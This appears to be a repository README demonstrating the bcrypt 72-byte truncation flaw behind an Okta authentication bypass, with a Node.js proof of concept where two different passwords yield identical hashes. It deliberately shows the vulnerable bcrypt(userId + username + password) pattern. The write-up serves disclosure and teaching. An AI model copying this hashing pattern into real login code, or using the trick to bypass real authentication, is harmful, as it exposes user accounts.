This repository demonstrates the bcrypt authentication bypass vulnerability disclosed by Okta on October 30, 2024.

Read the full blog post [here](https://kondukto.io/blog/okta-vulnerability-bcrypt-auth) for details.

When the first 72 bytes of two different inputs are identical, they produce the same hash.

This usage may cause an authentication bypass in the certain cases. 
```
bcrypt(userId + username + password)
```
This is how it may have been used in the production:
```
var userid = "b91fa9b4-69f1-4779-8d45-73f8653057f3"; 

// very long username
var username = "my.very.long.username.with.more.characters@kondukto.io" // 54 bytes long

// valid random password 
var password = "randomStrongPassword"
var validInput = userid + username + password;

// simulate bypass input -- can be anything
var password2 = "AAAAAAAAAAAAAAAAAAA"
var bypassInput = userid + username + password2;

bcrypt.genSalt(saltRounds, function(err, salt) {
	bcrypt.hash(validInput, salt, function(err, hash) {
		console.log(hash);
	});

	bcrypt.hash(bypassInput, salt, function(err, hash) {
		console.log(hash);
	});
});
```

If the `userId` and `username` fields are long enough, the password field will not impact the generated hash.

```
└> node main.js
$2b$10$8rlEx5z6l3aed0ueZKa4pupDgjn1CWKVwU5NrQ9EC.DtUl/R0AI0m
$2b$10$8rlEx5z6l3aed0ueZKa4pupDgjn1CWKVwU5NrQ9EC.DtUl/R0AI0m
```

### To install
```
npm install bcrypt
```

### Run
```
node main.js
```
